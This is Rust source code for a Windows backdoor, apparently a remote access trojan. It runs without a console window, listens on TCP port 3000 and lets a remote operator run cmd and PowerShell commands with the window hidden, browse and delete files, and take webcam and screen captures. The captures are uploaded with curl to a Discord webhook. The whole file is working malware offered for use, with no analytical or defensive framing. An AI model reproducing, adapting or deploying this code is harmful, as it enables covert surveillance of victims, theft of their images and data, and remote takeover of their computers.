#![windows_subsystem = "windows"]
static webhook: &'static str = "YOUR_DISCORD_WEBHOOK";
use std::thread;
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::str;
use std::fs::File;
use std::process::Command;
use std::env;
use scrap::{Capturer, Display};
use std::path::Path;
use std::os::windows::process::CommandExt;
use std::fs;
fn screenshot() {

    let mut capturer = Capturer::new(Display::primary().expect("Couldn't find primary display.")).expect("Couldn't begin capture.");
    let (w, h) = (&capturer.width(), &capturer.height());
    loop {
        let buffer = match capturer.frame() {
            Ok(buffer) => buffer,
            Err(error) => continue,
        };

        let mut bitflipped = Vec::with_capacity(w * h * 4);
        let stride = buffer.len() / h;

        for y in 0..*h {
            for x in 0..*w {
                let i = stride * y + 4 * x;
                bitflipped.extend_from_slice(&[
                    buffer[i + 2],
                    buffer[i + 1],
                    buffer[i],
                    255,
                ]);
            }
        }

        repng::encode(
            File::create("screenshot.png").unwrap(),
            *w as u32,
            *h as u32,
            &bitflipped,
        ).unwrap();
        drop(capturer);
        
        break;
    }
    
        
}
fn exec_sys(command: &str) -> String {
    let out = Command::new("cmd")
                        .args(&["/C", command])     
                        .creation_flags(0x08000000)
                        .output()
                        .unwrap();
    if String::from_utf8_lossy(&out.stdout) == "" {
        return String::from("Output was empty.");
    }
    return String::from_utf8_lossy(&out.stdout).to_string();
}
fn exec_shell(command: &str) -> String {
    let out = Command::new("powershell")
                        .args(&["-Command", command])     
                        .output()
                        .unwrap();
    if String::from_utf8_lossy(&out.stdout) == "" {
        return String::from("Output was empty.");
    }
    return String::from_utf8_lossy(&out.stdout).to_string();
}

fn handle_input(mut stream: TcpStream) {
   
    let mut data = [0 as u8; 1024*10];
    stream.write(exec_sys("whoami").as_bytes()).unwrap(); //Get the hostname
    loop {
        //Listen for commands
         match stream.read(&mut data) {
            Ok(size) => {
                //Split the command into segments
                let text = String::from_utf8_lossy(&data[0..size]);
                let index = text.find(":").unwrap();
                let command = &text[..index];
                let content = &text[index + 1..];        
                match command {
                    "sys" =>  {
                        let ret = exec_sys(content);
                        stream.write(b"").unwrap();
                        stream.write(ret.as_bytes()).unwrap();
                    },
                    "capture" => {
                        if content == "webcam" {
                        let cam = camera_capture::create(0).unwrap();
                        let cam = cam.fps(1.0).unwrap().start().unwrap();
                        for _image in cam {
                            _image.save("shot.png").unwrap();
                            
                            break;
                        }
                        stream.write(b"Webcam captured successfully.").unwrap();
                       let command1 = r#"curl -i -H 'Expect: application/json' -F file=@shot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }'"#;
                        let to_str: &str = &format!("{} {}", command1, webhook)[..];
                         exec_sys(to_str);
                        } else if content == "screen" {
                            screenshot();
                            stream.write(b"Screen captured successfully.").unwrap();
                            let command2 = r#"curl -i -H 'Expect: application/json' -F file=@screenshot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }'"#;
                            let to_str: &str = &format!("{} {}", command2, webhook)[..];
                            exec_sys(to_str);
                            
                        }
                        
                    },
                    "shell" => {
                        let ot = exec_shell(content);
                        stream.write(b"").unwrap();
                        stream.write(ot.as_bytes()).unwrap();
                    },
                    "cd" => {
                        match env::set_current_dir(Path::new(content)) {
                            Ok(_) => {
                                stream.write(format!("Successfully changed directory to: {}", content).as_bytes()).unwrap();
                            },
                            Err(e) => {
                                stream.write(format!("There was an error changing the directory: {}", e).as_bytes()).unwrap();
                            }
                        }
                    },
                    "listdir" => {
                        match fs::read_dir(content) {
                            Ok(iter) => {
                            let mut paths = vec![];
                            for path in iter {
                                paths.push(format!("{}", path.unwrap().path().display()));
                            }
                            let paths = paths.join("\n");
                            stream.write(paths.as_bytes()).unwrap();
                            }
                            Err(e) => {
                                stream.write(format!("There was an error reading the directory: {}", e).as_bytes()).unwrap();
                            },
                        }
                    },
                    "del" => {
                        match fs::remove_file(Path::new(content)) {
                            Ok(_) => {
                                stream.write(format!("Successfully deleted file {}", content).as_bytes()).unwrap();
                            }
                            Err(e) => {
                                stream.write(format!("There was an error deleting the requested file: {}", e).as_bytes()).unwrap();
                            }
                        }
                    }
                   
                    _ => (),
                };
                
                
            },
            Err(_) => {
            
                stream.shutdown(Shutdown::Both).unwrap();
                
            }
        }
    }
}


fn main() {
    let ip = "0.0.0.0";
    let port = "3000";
    env::set_current_dir(std::path::Path::new(&env::temp_dir())).unwrap();
    let listener = TcpListener::bind(format!("{}:{}", ip, port)).unwrap();
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
    
                thread::spawn(move|| {
                
                    handle_input(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                
            }
        }
    }
    
    drop(listener);
}
